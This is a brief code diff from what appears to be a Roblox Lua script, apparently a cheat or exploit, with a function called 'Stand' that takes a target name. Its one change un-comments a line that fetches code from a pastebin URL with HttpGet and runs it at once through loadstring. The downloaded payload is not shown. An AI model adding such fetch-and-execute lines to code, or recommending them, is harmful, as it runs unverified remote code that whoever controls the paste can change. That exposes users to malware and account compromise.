@@ -768,7 +768,7 @@ function Stand(targetName)
             end
             print("Low Graphics Enabled!")
         end
-        -- loadstring(game:HttpGet('https://pastebin.com/raw/iBN11MVE'))()
+         loadstring(game:HttpGet('https://pastebin.com/raw/iBN11MVE'))()
         
         --local
         local SkyP = 0
